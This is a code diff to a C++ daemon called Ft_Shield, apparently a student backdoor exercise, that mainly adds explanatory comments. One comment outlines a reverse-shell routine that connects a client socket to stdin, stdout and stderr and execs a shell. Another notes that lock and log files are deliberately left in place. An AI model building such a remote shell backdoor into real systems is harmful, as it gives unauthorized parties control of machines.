@@ -262,23 +262,36 @@ void	Ft_Shield::_runSrv(void)
 	return;
 }
 
+/*
+ * Function closing all the file descriptor before exiting
+ * Doesn't remove the log and lock files to avoid another instance
+ */
 void	Ft_Shield::_exit(void)
 {
 	this->_run = false;
 	for (int fd = 3; fd <= this->_maxfd; fd++)
 		close(fd);
-	//remove(DAEMON_LOCK_FILE);
-	//remove(DAEMON_LOG_FILE);
 
 	exit(EXIT_SUCCESS);
 }
 
+/*
+ * set this->_run to false and the server loop won't be launched
+ */
 void	Ft_Shield::_shutdown(int fd __attribute__((unused)))
 {
 	this->_run = false;
 	return;
 }
 
+/*
+ * Open a reverse shell to the client asking for it:
+ *  Child process:
+ *   - redirect stdin, stdout and stderr to the cliend fd
+ *   - excve a shell
+ *  Parent process:
+ *   - Disconnect the client from ft_shield to avoid fd conflict
+ */
 void	Ft_Shield::_reverseShell(int fd)
 {
 	int		pid = -1;
@@ -306,6 +319,9 @@ void	Ft_Shield::_reverseShell(int fd)
 	return;
 }
 
+/*
+ * Disconnect a client closing its fd
+ */
 void	Ft_Shield::_disconnect(int fd)
 {
 	close(fd);
@@ -314,6 +330,9 @@ void	Ft_Shield::_disconnect(int fd)
 	return;
 }
 
+/*
+ * Siple hhelp menu associated to the ehlp command
+ */
 void	Ft_Shield::_help(int fd)
 {
 	std::string	help;
